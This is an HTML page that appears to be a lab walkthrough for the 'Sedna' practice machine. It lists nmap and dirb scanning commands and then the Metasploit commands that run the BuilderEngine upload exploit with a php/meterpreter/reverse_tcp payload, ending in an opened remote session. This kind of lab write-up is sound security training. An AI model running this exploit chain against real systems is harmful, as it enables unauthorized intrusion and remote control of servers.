<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <center><h1 style="margin-top:100px;font-size:150px;color: red;">Sedna Machine</h1></center>
    <center><h2 style="margin-top: -100px;font-size: 50px;color: brown;">Walkthrough</h2></center>

    <h1 style="font-size: 50px;">Lets Start With Nmap</h1>
    
    <p style="font-size: 40px;margin-left: 60px;">nmap -A  -p-  -T4  -sV  --script  vuln  [ip]</p>
    
    <img style="margin-left: 60px;" src="./nmap_command.png" alt="">
    
    <h1 style="font-size: 50px;">The Open Ports</h1>
    
    <img style="margin-left: 60px;" src="./ports.png" alt="">

    
    <p style="font-size: 40px;margin-left: 60px;">Note : There Is Website </p>
    
    <h1 style="font-size: 50px;">Website</h1> 
    
    <img style="margin-left: 60px;" src="./Welcom_sedna.png" alt="">
    
    <h1 style="font-size: 50px;">Search Directories</h1> 
    
    <p style="font-size: 40px;margin-left: 60px;">dirb    [ip] </p>
    <img style="margin-left: 60px;" src="./dirb.png" alt="">
    <h1 style="font-size: 50px;">Result Of Search Directories</h1> 
    <p style="font-size: 40px;margin-left: 60px;">There Is This File : http://[ip]/modules/builder_market/license.txt</p>
    <img style="margin-left: 60px;" src="./link.png" alt="">
    <br><br><br>
    <p style="font-size: 40px;margin-left: 60px;">We Got A Service</p>
    <img style="margin-left: 60px;" src="./Version.png" alt="">
    <h1 style="font-size: 50px;">Lets Search With Google To Get Exploit</h1> 
    <p style="font-size: 40px;margin-left: 60px;">builderengine exploit</p>
    <img style="margin-left: 60px;" src="./search.png" alt="">
    <p style="font-size: 40px;margin-left: 60px;">Link : <a href="https://www.rapid7.com/db/modules/exploit/multi/http/builderengine_upload_exec/">Here</a></p>
    <h1 style="font-size: 50px;">Open Metasploit</h1> 
    <p style="font-size: 40px;margin-left: 60px;">Write : msfconsole      in kali</p>
    <img style="margin-left: 60px;" src="./msf.png" alt="">
    <h1 style="font-size: 50px;">Start Exploit</h1> 
    <p style="font-size: 40px;margin-left: 60px;">use exploit/multi/http/builderengine_upload_exec</p>
    <img style="margin-left: 60px;" src="./Msf_exploit.png" alt="">
    <p style="font-size: 40px;margin-left: 60px;">set RHOSTS   [ip]</p>
    <img style="margin-left: 60px;" src="./rhost.png" alt="">
    <p style="font-size: 40px;margin-left: 60px;">set PAYLOAD php/meterpreter/reverse_tcp</p>
    <img style="margin-left: 60px;" src="./payload.png" alt="">
    <h1 style="font-size: 50px;">Lets Run</h1> 
    <p style="font-size: 40px;margin-left: 60px;">run</p>
    <img style="margin-left: 60px;" src="./run.png" alt="">
    <p style="font-size: 40px;margin-left: 60px;">Meterpreter session opened</p>
    <img style="margin-left: 60px;" src="./session.png" alt="">
    <center><h1 style="margin-top:100px;font-size:90px;color: red;">Have Fun With Sedna</h1> </center>
    
    


</body>
</html>
